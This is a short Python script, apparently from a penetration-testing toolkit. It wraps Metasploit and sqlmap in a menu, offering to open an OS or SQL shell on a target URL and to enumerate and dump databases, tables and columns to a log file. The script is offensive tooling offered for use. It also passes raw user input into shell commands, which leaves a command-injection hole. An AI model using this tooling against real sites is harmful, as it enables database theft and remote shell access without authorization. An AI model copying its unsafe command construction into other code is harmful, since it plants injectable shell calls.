import os

def exploit_menu():
	choice=0
	os.system("figlet -f big Exploitation Tools") 
	while(choice<1 or choice>5):
		print("1.\tMetasploit Framework")
		print("2.\tSQLmap")
		print("3.\tExit")
		choice=int(input("Enter your choice: "))
		
		if(choice<1 or choice>3):
			print("Enter a valid choice...")
			continue

		if(choice==1):
			os.system('msfconsole')
		elif(choice == 2):
			sqlmap()
		elif(choice == 3):
			return

		input("Press enter to continue")
		os.system('clear')
		exploit_menu()

def sqlmap():
	os.system('clear')
	base='sqlmap -u '
	req = input('Enter the request url\t: ')
	print('Get OS shell\t1')
	print('Get SQL shell\t2')
	print('Continue\t>=3')
	choice = int(input('Enter choice\t: '))
	if(choice==1):
		os.system(f'{base+req} --os-shell'+" |tee -a output.txt")
		return
	elif(choice==2):
		os.system(f'{base+req} --sql-shell'+" |tee -a output.txt")
		return


	os.system(f'{base+req} --dbs')
	
	dbname = input('Enter the Database Name\t: ')
	os.system(f'{base+req} -D {dbname} --tables'+" |tee -a output.txt")

	tname = input('Enter the table name\t: ')
	os.system(f'{base+req} -D {dbname} -T {tname} --columns'+" |tee -a output.txt")

	cols = input('Enter the columns (comma)\t: ')
	if(len(cols)>0):
		os.system(f'{base+req} -D {dbname} -T {tname} -C {cols} --dump'+" |tee -a output.txt")
	else:
		os.system(f'{base+req} -D {dbname} -T {tname} --dump'+" |tee -a output.txt")
